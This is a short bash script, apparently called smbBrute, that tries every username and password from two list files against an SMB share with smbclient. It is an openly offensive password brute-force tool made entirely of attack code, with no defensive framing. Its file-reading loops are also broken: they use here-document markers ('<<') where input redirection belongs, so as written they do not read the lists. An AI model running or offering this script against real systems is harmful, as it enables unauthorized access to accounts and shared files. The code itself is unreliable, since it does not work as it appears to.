#!/bin/bash

if [ $# -ne 4 ]; then
    echo  "Usage ./smbBrute <SHARE> <USER.LST> <PASS.LST> <DOMAIN>"
    exit
fi

ip="$1"
userlist="$2"
passlist="$3"
domain="$4"

while read u; do 
    while read p; do 
        echo "smbclient $ip -U $u%$p -W $domain"
        smbclient $ip -U $u%$p -W $domain << CMDS
exit
CMDS
    done << $passlist
done << $userlist
